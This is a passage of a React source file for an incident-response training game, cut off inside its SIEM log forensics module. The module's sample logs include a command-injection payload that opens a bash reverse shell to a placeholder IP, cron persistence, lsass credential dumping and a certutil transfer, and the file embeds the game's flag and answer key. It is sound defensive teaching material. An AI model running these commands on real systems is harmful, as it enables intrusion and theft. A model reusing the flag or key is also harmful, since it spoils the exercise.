import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  Terminal, 
  Flame, 
  Key, 
  CheckCircle2, 
  XCircle, 
  AlertTriangle, 
  HelpCircle, 
  Trophy, 
  RefreshCw, 
  Play, 
  Zap, 
  Lock, 
  Unlock, 
  Eye, 
  FileCode, 
  Server, 
  Cpu, 
  Volume2, 
  VolumeX,
  ChevronRight,
  ArrowRight,
  ExternalLink,
  Search,
  Filter,
  Activity,
  Layers,
  Radio,
  Binary,
  Code,
  ShieldCheck,
  Hash,
  Database,
  Crosshair,
  Sliders,
  CornerDownRight,
  Copy,
  Check,
  Clock,
  Network
} from 'lucide-react';
import { MiniGameId, WarRoomModuleId } from '../types';

interface CyberMiniGamesProps {
  onGameComplete?: (gameId: MiniGameId, score: number) => void;
  onUnlockFlag?: (flag: string) => void;
}

// Web Audio sound synthesizer for authentic SOC tactical feedback
const playCyberSound = (type: 'success' | 'error' | 'click' | 'powerup' | 'alarm' | 'keystroke', enabled = true) => {
  if (!enabled || typeof window === 'undefined') return;
  try {
    const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);

    const now = ctx.currentTime;
    if (type === 'click') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(800, now);
      osc.frequency.exponentialRampToValueAtTime(1200, now + 0.04);
      gain.gain.setValueAtTime(0.06, now);
      gain.gain.linearRampToValueAtTime(0.005, now + 0.04);
      osc.start(now);
      osc.stop(now + 0.04);
    } else if (type === 'keystroke') {
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(520, now);
      gain.gain.setValueAtTime(0.03, now);
      gain.gain.linearRampToValueAtTime(0.001, now + 0.03);
      osc.start(now);
      osc.stop(now + 0.03);
    } else if (type === 'success') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(523.25, now); // C5
      osc.frequency.setValueAtTime(659.25, now + 0.08); // E5
      osc.frequency.setValueAtTime(783.99, now + 0.16); // G5
      osc.frequency.setValueAtTime(1046.50, now + 0.24); // C6
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.linearRampToValueAtTime(0.01, now + 0.4);
      osc.start(now);
      osc.stop(now + 0.4);
    } else if (type === 'error') {
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(220, now);
      osc.frequency.linearRampToValueAtTime(110, now + 0.15);
      gain.gain.setValueAtTime(0.12, now);
      gain.gain.linearRampToValueAtTime(0.01, now + 0.25);
      osc.start(now);
      osc.stop(now + 0.25);
    } else if (type === 'powerup') {
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(320, now);
      osc.frequency.exponentialRampToValueAtTime(960, now + 0.3);
      gain.gain.setValueAtTime(0.12, now);
      gain.gain.linearRampToValueAtTime(0.01, now + 0.45);
      osc.start(now);
      osc.stop(now + 0.45);
    } else if (type === 'alarm') {
      osc.type = 'square';
      osc.frequency.setValueAtTime(880, now);
      osc.frequency.setValueAtTime(660, now + 0.1);
      gain.gain.setValueAtTime(0.08, now);
      gain.gain.linearRampToValueAtTime(0.01, now + 0.2);
      osc.start(now);
      osc.stop(now + 0.2);
    }
  } catch {
    // Ignore audio context initialization in constrained frames
  }
};

export const CyberMiniGames: React.FC<CyberMiniGamesProps> = ({ onGameComplete, onUnlockFlag }) => {
  const [activeModule, setActiveModule] = useState<WarRoomModuleId>('siem-forensics');
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [totalXp, setTotalXp] = useState(0);
  const [completedModules, setCompletedModules] = useState<Record<WarRoomModuleId, boolean>>({
    'siem-forensics': false,
    'web-exploit-chain': false,
    'memory-malware': false,
    'smart-contract': false,
    'binary-rop': false,
  });
  const [sysUtcTime, setSysUtcTime] = useState('');

  // Live SOC UTC Clock
  useEffect(() => {
    const updateTime = () => {
      const d = new Date();
      setSysUtcTime(d.toUTCString().replace('GMT', 'UTC'));
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, []);

  // Load state from localStorage if available
  useEffect(() => {
    try {
      const savedXp = localStorage.getItem('cybernetics_warroom_xp');
      const savedComp = localStorage.getItem('cybernetics_warroom_completed');
      if (savedXp) setTotalXp(parseInt(savedXp, 10));
      if (savedComp) {
        const parsed = JSON.parse(savedComp);
        setCompletedModules(prev => ({ ...prev, ...parsed }));
      }
    } catch {
      // Local storage fallback
    }
  }, []);

  const markModuleCompleted = (modId: WarRoomModuleId, xpEarned: number) => {
    setCompletedModules(prev => {
      const next = { ...prev, [modId]: true };
      try {
        localStorage.setItem('cybernetics_warroom_completed', JSON.stringify(next));
      } catch {}
      return next;
    });

    setTotalXp(prev => {
      const nextXp = prev + xpEarned;
      try {
        localStorage.setItem('cybernetics_warroom_xp', nextXp.toString());
      } catch {}
      return nextXp;
    });

    playCyberSound('success', soundEnabled);

    if (onGameComplete) {
      onGameComplete(modId, xpEarned);
    }

    // Check if all completed
    const allDone = Object.keys(completedModules).every(k => k === modId || completedModules[k as WarRoomModuleId]);
    if (allDone && onUnlockFlag) {
      onUnlockFlag('CYBERNETICS{SOC_TIER3_WAR_ROOM_DIRECTOR_2025}');
    }
  };

  const solvedCount = Object.values(completedModules).filter(Boolean).length;

  return (
    <section id="games" className="py-24 bg-[#060911] text-slate-100 border-t border-b border-cyan-950/40 relative overflow-hidden">
      {/* Target anchor for war-room */}
      <div id="war-room" className="absolute -top-16 left-0 w-0 h-0" />

      {/* Background SOC Radar & Scanlines Grid */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#0c16260a_1px,transparent_1px),linear-gradient(to_bottom,#0c16260a_1px,transparent_1px)] bg-[size:32px_32px] pointer-events-none opacity-60" />
      <div className="absolute -top-32 -left-32 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute -bottom-32 -right-32 w-96 h-96 bg-rose-500/5 rounded-full blur-3xl pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* SOC Operations Command Bar */}
        <div className="mb-6 bg-[#0a0f1d] border border-cyan-900/40 rounded-xl p-3.5 flex flex-wrap items-center justify-between gap-4 shadow-[0_4px_30px_rgba(0,0,0,0.5)]">
          <div className="flex items-center gap-3">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-3 w-3 bg-rose-500"></span>
            </span>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono font-bold text-rose-400 tracking-wider uppercase">DEFCON 2</span>
              <span className="text-slate-600">|</span>
              <span className="text-xs font-mono text-cyan-300">LIVE THREAT ENGAGEMENT</span>
            </div>
            <div className="hidden md:flex items-center gap-2 text-xs font-mono text-slate-400 border-l border-slate-800 pl-3">
              <Clock className="w-3.5 h-3.5 text-slate-500" />
              <span>{sysUtcTime || '2025-05-18 19:42:01 UTC'}</span>
            </div>
          </div>

          <div className="flex items-center gap-4">
            {/* Clearance & XP */}
            <div className="flex items-center gap-2 bg-[#050b14] px-3 py-1 rounded-lg border border-slate-800 text-xs font-mono">
              <Trophy className="w-3.5 h-3.5 text-amber-400" />
              <span className="text-slate-400">Clearance XP:</span>
              <span className="font-bold text-amber-300">{totalXp} XP</span>
              <span className="text-slate-600">|</span>
              <span className="text-cyan-400 font-semibold">{solvedCount}/5 Mitigated</span>
            </div>

            {/* Sound Toggle */}
            <button
              onClick={() => {
                setSoundEnabled(!soundEnabled);
                playCyberSound('click', !soundEnabled);
              }}
              className="p-1.5 rounded-lg bg-[#050b14] border border-slate-800 text-slate-400 hover:text-cyan-300 transition-colors cursor-pointer"
              title={soundEnabled ? 'Mute SOC Audio FX' : 'Enable SOC Audio FX'}
            >
              {soundEnabled ? <Volume2 className="w-4 h-4 text-cyan-400" /> : <VolumeX className="w-4 h-4" />}
            </button>

            {/* Reset */}
            <button
              onClick={() => {
                localStorage.removeItem('cybernetics_warroom_xp');
                localStorage.removeItem('cybernetics_warroom_completed');
                setTotalXp(0);
                setCompletedModules({
                  'siem-forensics': false,
                  'web-exploit-chain': false,
                  'memory-malware': false,
                  'smart-contract': false,
                  'binary-rop': false,
                });
                playCyberSound('click', soundEnabled);
              }}
              className="px-2.5 py-1 rounded-lg bg-[#050b14] hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-rose-300 text-xs font-mono transition-colors cursor-pointer"
              title="Reset All Incident Progress"
            >
              Reset Scenarios
            </button>
          </div>
        </div>

        {/* Section Header */}
        <div className="text-center max-w-3xl mx-auto mb-10">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-950/70 border border-cyan-500/40 text-cyan-300 text-xs font-mono mb-4">
            <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
            <span>INCIDENT RESPONSE & CYBER WAR ROOM // TIER-3 SOC SIMULATION</span>
          </div>
          <h2 className="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight mb-4 font-mono">
            LIVE WAR ROOM <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-sky-300 to-indigo-400">INCIDENT RESPONSE</span>
          </h2>
          <p className="text-slate-300 text-sm sm:text-base leading-relaxed">
            Step into the role of a Principal Incident Responder and Threat Hunter. Analyze raw telemetries, reconstruct multi-stage exploitation kill chains, inspect injected memory spaces, audit smart contract logic, and construct x86_64 ROP chains.
          </p>
        </div>

        {/* Module Selector - 5 Enterprise SOC Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3 mb-8">
          {[
            {
              id: 'siem-forensics' as WarRoomModuleId,
              title: 'SIEM Log Forensics',
              category: 'Kill Chain Reconstruction',
              severity: 'SEV-1 CRITICAL',
              severityColor: 'text-rose-400 bg-rose-950/40 border-rose-800/60',
              mitre: 'T1190 / T1059',
              icon: Activity,
              xp: '+250 XP',
              brief: 'Parse raw Sysmon & web events to piece together the attacker trajectory.'
            },
            {
              id: 'web-exploit-chain' as WarRoomModuleId,
              title: 'Web Exploit Chain',
              category: 'IDOR + JWT + File Bypass',
              severity: 'SEV-1 CRITICAL',
              severityColor: 'text-amber-400 bg-amber-950/40 border-amber-800/60',
              mitre: 'T1190 / T1078',
              icon: FileCode,
              xp: '+250 XP',
              brief: 'Chain authorization tampering, cryptographic JWT forgery, and MIME bypass.'
            },
            {
              id: 'memory-malware' as WarRoomModuleId,
              title: 'Memory & C2 Triage',
              category: 'Volatility & PCAP Dissection',
              severity: 'SEV-2 HIGH',
              severityColor: 'text-purple-400 bg-purple-950/40 border-purple-800/60',
              mitre: 'T1055 / T1071',
              icon: Server,
              xp: '+250 XP',
              brief: 'Analyze unbacked process memory, XOR heuristics, and network beacons.'
            },
            {
              id: 'smart-contract' as WarRoomModuleId,
              title: 'Smart Contract Audit',
              category: 'DeFi Reentrancy Flaw',
              severity: 'SEV-1 CRITICAL',
              severityColor: 'text-emerald-400 bg-emerald-950/40 border-emerald-800/60',
              mitre: 'CWE-841 / SWC-107',
              icon: Database,
              xp: '+200 XP',
              brief: 'Debug vulnerable Solidity liquidity vault and execute reentrant drain.'
            },
            {
              id: 'binary-rop' as WarRoomModuleId,
              title: 'Binary Analysis & ROP',
              category: 'x86_64 Stack & Gadgets',
              severity: 'SEV-1 CRITICAL',
              severityColor: 'text-cyan-400 bg-cyan-950/40 border-cyan-800/60',
              mitre: 'T1203 / CWE-121',
              icon: Binary,
              xp: '+300 XP',
              brief: 'Calculate cyclic buffer offset and chain ROP gadgets to spawn root shell.'
            },
          ].map((mod) => {
            const Icon = mod.icon;
            const isDone = completedModules[mod.id];
            const isActive = activeModule === mod.id;
            return (
              <button
                key={mod.id}
                onClick={() => {
                  setActiveModule(mod.id);
                  playCyberSound('click', soundEnabled);
                }}
                className={`p-4 rounded-xl border text-left flex flex-col justify-between transition-all relative cursor-pointer ${
                  isActive
                    ? 'bg-gradient-to-br from-[#0e1c33] to-[#071120] border-cyan-400 shadow-[0_0_24px_rgba(6,182,212,0.25)]'
                    : 'bg-[#090f1a] border-slate-800/80 hover:border-slate-700 hover:bg-[#0d1525]'
                }`}
              >
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <div className={`p-2 rounded-lg ${isActive ? 'bg-cyan-500/20 text-cyan-300' : 'bg-slate-800/70 text-slate-400'}`}>
                      <Icon className="w-4 h-4" />
                    </div>
                    {isDone ? (
                      <span className="flex items-center gap-1 text-[10px] font-mono font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-800 px-2 py-0.5 rounded-full">
                        <CheckCircle2 className="w-3 h-3" /> RESOLVED
                      </span>
                    ) : (
                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${mod.severityColor}`}>
                        {mod.severity}
                      </span>
                    )}
                  </div>
                  <h3 className="font-mono font-bold text-sm text-white mb-0.5">{mod.title}</h3>
                  <div className="text-[11px] font-mono text-cyan-400/90 mb-2">{mod.category}</div>
                  <p className="text-xs text-slate-400 line-clamp-2 mb-3 leading-relaxed">{mod.brief}</p>
                </div>

                <div className="flex items-center justify-between pt-2 border-t border-slate-800/60 text-[10px] font-mono text-slate-400">
                  <span className="text-slate-500">MITRE: {mod.mitre}</span>
                  <span className="text-cyan-300 font-semibold">{mod.xp}</span>
                </div>
              </button>
            );
          })}
        </div>

        {/* Active Module Investigation Console */}
        <div className="bg-[#080d19] border border-cyan-900/40 rounded-2xl p-4 sm:p-6 shadow-2xl relative">
          
          {activeModule === 'siem-forensics' && (
            <SiemForensicsModule 
              soundEnabled={soundEnabled} 
              isCompleted={completedModules['siem-forensics']}
              onComplete={() => markModuleCompleted('siem-forensics', 250)}
            />
          )}

          {activeModule === 'web-exploit-chain' && (
            <WebExploitChainModule 
              soundEnabled={soundEnabled} 
              isCompleted={completedModules['web-exploit-chain']}
              onComplete={() => markModuleCompleted('web-exploit-chain', 250)}
            />
          )}

          {activeModule === 'memory-malware' && (
            <MemoryMalwareModule 
              soundEnabled={soundEnabled} 
              isCompleted={completedModules['memory-malware']}
              onComplete={() => markModuleCompleted('memory-malware', 250)}
            />
          )}

          {activeModule === 'smart-contract' && (
            <SmartContractAuditModule 
              soundEnabled={soundEnabled} 
              isCompleted={completedModules['smart-contract']}
              onComplete={() => markModuleCompleted('smart-contract', 200)}
            />
          )}

          {activeModule === 'binary-rop' && (
            <BinaryRopModule 
              soundEnabled={soundEnabled} 
              isCompleted={completedModules['binary-rop']}
              onComplete={() => markModuleCompleted('binary-rop', 300)}
            />
          )}

        </div>

        {/* External Link Callout to Official Live Portal */}
        <div className="mt-8 bg-gradient-to-r from-cyan-950/30 via-slate-900/60 to-indigo-950/30 border border-cyan-800/30 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-3 text-sm">
            <ShieldCheck className="w-5 h-5 text-cyan-400 shrink-0" />
            <div>
              <span className="font-semibold text-white">Full-Spectrum Adversary Emulation & Collegiate Wargames</span>
              <p className="text-slate-400 text-xs">Train with our Collegiate Cyber Defense Competition (CCDC) team on dedicated live target networks.</p>
            </div>
          </div>
          <a
            href="https://cybernetics-club.vercel.app"
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-semibold tracking-wide transition-all shadow-[0_0_15px_rgba(6,182,212,0.3)] shrink-0"
          >
            <span>JOIN DEFENSE BRIGADE</span>
            <ExternalLink className="w-3.5 h-3.5" />
          </a>
        </div>

      </div>
    </section>
  );
};

/* ========================================================================= */
/* MODULE 1: LOG FORENSICS & SIEM RECONSTRUCTION (KILL CHAIN RECONSTRUCTION)   */
/* ========================================================================= */

interface ModuleProps {
  soundEnabled: boolean;
  isCompleted: boolean;
  onComplete: () => void;
}

interface LogEvent {
  id: string;
  timestamp: string;
  source: 'Sysmon' | 'AuthLog' | 'Nginx' | 'CloudTrail';
  eventId?: number;
  level: 'INFO' | 'WARN' | 'CRITICAL';
  host: string;
  summary: string;
  rawDetails: {
    user?: string;
    ip?: string;
    process?: string;
    parentProcess?: string;
    commandLine?: string;
    hash?: string;
    url?: string;
    status?: number;
  };
  isAttackerKillChain: boolean;
  killChainPhase?: 'Initial Access' | 'Persistence' | 'Credential Dumping' | 'Exfiltration';
}

const RAW_LOG_DATASET: LogEvent[] = [
  {
    id: 'EVT-101',
    timestamp: '2025-05-18 14:02:11.104',
    source: 'Nginx',
    level: 'INFO',
    host: 'edge-web-01',
    summary: 'GET /api/v1/health HTTP/1.1 200 OK',
    rawDetails: { ip: '10.0.0.12', url: '/api/v1/health', status: 200 },
    isAttackerKillChain: false
  },
  {
    id: 'EVT-102',
    timestamp: '2025-05-18 14:05:43.882',
    source: 'Nginx',
    level: 'CRITICAL',
    host: 'edge-web-01',
    summary: 'POST /api/v1/auth/exchange?redirect=;bash${IFS}-i>&/dev/tcp/198.51.100.42/4444<&1 500 ERR',
    rawDetails: { 
      ip: '198.51.100.42', 
      url: '/api/v1/auth/exchange', 
      status: 500,
      commandLine: 'Command injection attempt in redirect parameter spawning reverse shell to 198.51.100.42:4444' 
    },
    isAttackerKillChain: true,
    killChainPhase: 'Initial Access'
  },
  {
    id: 'EVT-103',
    timestamp: '2025-05-18 14:05:45.012',
    source: 'Sysmon',
    eventId: 1,
    level: 'CRITICAL',
    host: 'edge-web-01',
    summary: 'Process Create: /bin/bash spawned by www-data (nginx worker)',
    rawDetails: { 
      user: 'www-data', 
      process: '/bin/bash', 
      parentProcess: '/usr/sbin/nginx', 
      commandLine: 'bash -i' 
    },
    isAttackerKillChain: true,
    killChainPhase: 'Initial Access'
  },
  {
    id: 'EVT-104',
    timestamp: '2025-05-18 14:08:19.412',
    source: 'AuthLog',
    level: 'INFO',
    host: 'edge-web-01',
    summary: 'pam_unix(cron:session): session opened for user root',
    rawDetails: { user: 'root', process: 'CRON' },
    isAttackerKillChain: false
  },
  {
    id: 'EVT-105',
    timestamp: '2025-05-18 14:11:02.943',
    source: 'Sysmon',
    eventId: 1,
    level: 'CRITICAL',
    host: 'edge-web-01',
    summary: 'Process Create: crontab -e & echo "* * * * * root /etc/cron.d/svc_sync.sh" >> /etc/crontab',
    rawDetails: { 
      user: 'root', 
      process: '/usr/bin/crontab', 
      parentProcess: '/bin/bash', 
      commandLine: 'echo "* * * * * root /etc/cron.d/svc_sync.sh" >> /etc/crontab' 
    },
    isAttackerKillChain: true,
    killChainPhase: 'Persistence'
  },
  {
    id: 'EVT-106',
    timestamp: '2025-05-18 14:14:55.301',
    source: 'CloudTrail',
    level: 'INFO',
    host: 'aws-iam',
    summary: 'DescribeInstances called by role/EC2InternalServiceRole',
    rawDetails: { user: 'EC2InternalServiceRole', ip: '10.0.0.12' },
    isAttackerKillChain: false
  },
  {
    id: 'EVT-107',
    timestamp: '2025-05-18 14:18:22.715',
    source: 'Sysmon',
    eventId: 10,
    level: 'CRITICAL',
    host: 'corp-dc-01',
    summary: 'ProcessAccess: svchost_updater.exe opened lsass.exe with PROCESS_ALL_ACCESS (0x1FFFFF)',
    rawDetails: { 
      user: 'NT AUTHORITY\\SYSTEM', 
      process: 'C:\\ProgramData\\svchost_updater.exe', 
      parentProcess: 'cmd.exe', 
      hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' 
    },
    isAttackerKillChain: true,
    killChainPhase: 'Credential Dumping'
  },
  {
    id: 'EVT-108',
    timestamp: '2025-05-18 14:23:40.551',
    source: 'Sysmon',
    eventId: 3,
    level: 'CRITICAL',
    host: 'corp-dc-01',
    summary: 'NetworkConnect: outbound TLS to 82.102.23.119:443 (142.8 MB transferred)',
    rawDetails: { 
      ip: '82.102.23.119', 
      process: 'C:\\Windows\\System32\\certutil.exe', 
      commandLine: 'certutil.exe -urlcache -split -f https://82.102.23.119:443/loot_enc.bin' 
    },
    isAttackerKillChain: true,
    killChainPhase: 'Exfiltration'
  },
  {
    id: 'EVT-109',
    timestamp: '2025-05-18 14:25:01.002',
    source: 'AuthLog',
    level: 'INFO',
    host: 'edge-web-01',
    summary: 'Accepted publickey for deployer from 10.0.0.4',
    rawDetails: { user: 'deployer', ip: '10.0.0.4' },
    isAttackerKillChain: false
  }
];

const SiemForensicsModule: React.FC<ModuleProps> = ({ soundEnabled, isCompleted, onComplete }) => {
  const [filterQuery, setFilterQuery] = useState('');
  const [selectedEvent, setSelectedEvent] = useState<LogEvent | null>(RAW_LOG_DATASET[1]);
  const [taggedPhases, setTaggedPhases] = useState<{
    initialAccess: string;
    persistence: string;
    credDump: string;
    exfiltration: string;
  }>({
    initialAccess: '',
    persistence: '',
    credDump: '',
    exfiltration: ''
  });
  const [validationError, setValidationError] = useState('');
  const [showHint, setShowHint] = useState(false);

  const filteredLogs = RAW_LOG_DATASET.filter(log => {
    if (!filterQuery) return true;
    const q = filterQuery.toLowerCase();
    return (
      log.summary.toLowerCase().includes(q) ||
      log.source.toLowerCase().includes(q) ||
      log.host.toLowerCase().includes(q) ||
      (log.eventId && log.eventId.toString().includes(q)) ||
      (log.rawDetails.ip && log.rawDetails.ip.includes(q))
    );
  });

  const handleSelectEvent = (log: LogEvent) => {
    setSelectedEvent(log);
    playCyberSound('keystroke', soundEnabled);
  };

  const handleTagEventToPhase = (phase: 'initialAccess' | 'persistence' | 'credDump' | 'exfiltration') => {
    if (!selectedEvent) return;
    setTaggedPhases(prev => ({
      ...prev,
      [phase]: selectedEvent.id
    }));
    playCyberSound('click', soundEnabled);
  };

  const verifyKillChain = () => {
    // Valid killchain:
    // Initial: EVT-102 or EVT-103
    // Persistence: EVT-105
    // Cred Dump: EVT-107
    // Exfiltration: EVT-108
    const isInitialOk = taggedPhases.initialAccess === 'EVT-102' || taggedPhases.initialAccess === 'EVT-103';
    const isPersistenceOk = taggedPhases.persistence === 'EVT-105';
    const isCredOk = taggedPhases.credDump === 'EVT-107';
    const isExfilOk = taggedPhases.exfiltration === 'EVT-108';

    if (!taggedPhases.initialAccess || !taggedPhases.persistence || !taggedPhases.credDump || !taggedPhases.exfiltration) {
      setValidationError('Please tag all 4 stages of the kill chain before submitting verification.');
      playCyberSound('error', soundEnabled);
      return;
    }

    if (isInitialOk && isPersistenceOk && isCredOk && isExfilOk) {
      setValidationError('');
      onComplete();
    } else {
      setValidationError('Kill chain reconstruction mismatch. Inspect the Sysmon Event IDs and commandlines carefully.');
      playCyberSound('error', soundEnabled);
    }
  };

  return (
    <div className="space-y-6">
      {/* Module Title & Context */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-rose-400 bg-rose-950/60 border border-rose-800/80 px-2 py-0.5 rounded">
              CASE: INC-9042-APT
            </span>
            <span className="text-xs font-mono text-slate-400">TARGET: CORP-FIN-CLUSTER // EDGE DMZ</span>
          </div>
          <h3 className="text-xl font-bold font-mono text-white">SIEM Log Forensics & Kill Chain Reconstruction</h3>
          <p className="text-xs text-slate-400">
            A critical web gateway triggered alerts. Parse raw Sysmon, Auth, and Web telemetries to reconstruct the 4-stage adversary kill chain.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setShowHint(!showHint)}
            className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-300 hover:text-cyan-300 text-xs font-mono inline-flex items-center gap-1.5 cursor-pointer"
          >
            <HelpCircle className="w-3.5 h-3.5 text-cyan-400" />
            <span>{showHint ? 'Hide SOC Intel' : 'SOC Intel Brief'}</span>
          </button>
        </div>
      </div>

      {showHint && (
        <div className="p-3.5 rounded-lg bg-cyan-950/40 border border-cyan-800/60 text-xs font-mono text-cyan-200/90 space-y-1">
          <div className="font-bold text-cyan-300 flex items-center gap-1">
            <ShieldAlert className="w-3.5 h-3.5" /> THREAT INTEL BULLETIN:
          </div>
          <p>1. Look for command injection attempts on HTTP endpoints (e.g. semicolon/bash invocation).</p>
          <p>2. Persistence in Linux often leverages scheduled cron entries in `/etc/crontab`.</p>
          <p>3. Sysmon Event ID 10 flags process memory access; look for malicious handles opened to `lsass.exe`.</p>
          <p>4. Exfiltration involves outbound file staging or large transfers to unfamiliar external IPs.</p>
        </div>
      )}

      {/* SIEM Query Filter Bar */}
      <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2">
        <div className="relative flex-1">
          <Search className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={filterQuery}
            onChange={(e) => setFilterQuery(e.target.value)}
            placeholder="Search SIEM: 'Sysmon', 'EventID: 10', 'lsass', '198.51.100', 'bash'..."
            className="w-full pl-9 pr-3 py-2 bg-[#050b14] border border-slate-700/80 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
          />
        </div>
        <div className="flex items-center gap-1.5 overflow-x-auto text-xs font-mono">
          <button 
            onClick={() => setFilterQuery('')} 
            className="px-2.5 py-1.5 rounded bg-slate-900 hover:bg-slate-800 text-slate-400 border border-slate-800"
          >
            Clear
          </button>
          <button 
            onClick={() => setFilterQuery('CRITICAL')} 
            className="px-2.5 py-1.5 rounded bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-800"
          >
            Critical Only
          </button>
          <button 
            onClick={() => setFilterQuery('Sysmon')} 
            className="px-2.5 py-1.5 rounded bg-cyan-950/40 hover:bg-cyan-900/60 text-cyan-300 border border-cyan-800"
          >
            Sysmon
          </button>
          <button 
            onClick={() => setFilterQuery('lsass')} 
            className="px-2.5 py-1.5 rounded bg-purple-950/40 hover:bg-purple-900/60 text-purple-300 border border-purple-800"
          >
            LSASS
          </button>
        </div>
      </div>

      {/* Split Ingestion Log Stream & Event Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        {/* Left: Log Feed List */}
        <div className="lg:col-span-7 bg-[#050914] border border-slate-800 rounded-xl overflow-hidden flex flex-col h-80">
          <div className="bg-[#0b1220] px-3 py-2 border-b border-slate-800 text-[11px] font-mono text-slate-400 flex items-center justify-between">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-400" />
              INGESTION STREAM ({filteredLogs.length} events matching)
            </span>
            <span className="text-slate-500">FORMAT: CEF / JSON</span>
          </div>

          <div className="flex-1 overflow-y-auto divide-y divide-slate-900 text-xs font-mono">
            {filteredLogs.map(log => {
              const isSelected = selectedEvent?.id === log.id;
              return (
                <div
                  key={log.id}
                  onClick={() => handleSelectEvent(log)}
                  className={`p-2.5 cursor-pointer transition-colors flex items-start gap-2.5 ${
                    isSelected ? 'bg-cyan-950/40 border-l-2 border-cyan-400' : 'hover:bg-slate-900/60'
                  }`}
                >
                  <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                    log.level === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border border-rose-800' : 'bg-slate-800 text-slate-400'
                  }`}>
                    {log.level}
                  </span>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 text-slate-400 text-[10px] mb-0.5">
                      <span className="text-cyan-300">{log.source}{log.eventId ? `:${log.eventId}` : ''}</span>
                      <span>•</span>
                      <span>{log.host}</span>
                      <span>•</span>
                      <span className="text-slate-500">{log.timestamp.split(' ')[1]}</span>
                    </div>
                    <div className="text-slate-200 truncate text-[11px] font-mono">{log.summary}</div>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right: Selected Event Raw Telemetry & Tagging */}
        <div className="lg:col-span-5 bg-[#050914] border border-slate-800 rounded-xl p-3.5 flex flex-col justify-between h-80">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-800 text-xs font-mono">
              <span className="text-cyan-400 font-bold flex items-center gap-1.5">
                <FileCode className="w-3.5 h-3.5" />
                RAW EVENT INSPECTOR
              </span>
              <span className="text-slate-400 font-mono text-[11px]">{selectedEvent?.id}</span>
            </div>

            {selectedEvent ? (
              <div className="space-y-2 text-xs font-mono overflow-y-auto max-h-44 pr-1">
                <div className="bg-[#0b1220] p-2 rounded border border-slate-800 text-slate-300 break-words text-[11px]">
                  <span className="text-slate-500">TIMESTAMP: </span>{selectedEvent.timestamp}<br/>
                  <span className="text-slate-500">HOST: </span>{selectedEvent.host}<br/>
                  <span className="text-slate-500">SOURCE: </span>{selectedEvent.source}{selectedEvent.eventId ? ` (EventID: ${selectedEvent.eventId})` : ''}<br/>
                  {selectedEvent.rawDetails.user && <>
                    <span className="text-slate-500">USER: </span>{selectedEvent.rawDetails.user}<br/>
                  </>}
                  {selectedEvent.rawDetails.ip && <>
                    <span className="text-slate-500">REMOTE_IP: </span><span className="text-amber-300">{selectedEvent.rawDetails.ip}</span><br/>
                  </>}
                  {selectedEvent.rawDetails.commandLine && <>
                    <span className="text-slate-500">CMDLINE: </span>
                    <span className="text-rose-300 font-mono break-all">{selectedEvent.rawDetails.commandLine}</span><br/>
                  </>}
                  {selectedEvent.rawDetails.hash && <>
                    <span className="text-slate-500">SHA256: </span><span className="text-slate-400 text-[10px] break-all">{selectedEvent.rawDetails.hash}</span><br/>
                  </>}
                </div>
              </div>
            ) : (
              <div className="text-slate-500 text-xs font-mono py-8 text-center">Select an event from the stream to inspect</div>
            )}
          </div>

          {/* Quick Tagging Buttons */}
          <div className="pt-2 border-t border-slate-800">
            <div className="text-[10px] font-mono text-slate-400 mb-1.5">Tag this event to Kill Chain phase:</div>
            <div className="grid grid-cols-2 gap-1.5 text-[10px] font-mono">
              <button
                onClick={() => handleTagEventToPhase('initialAccess')}
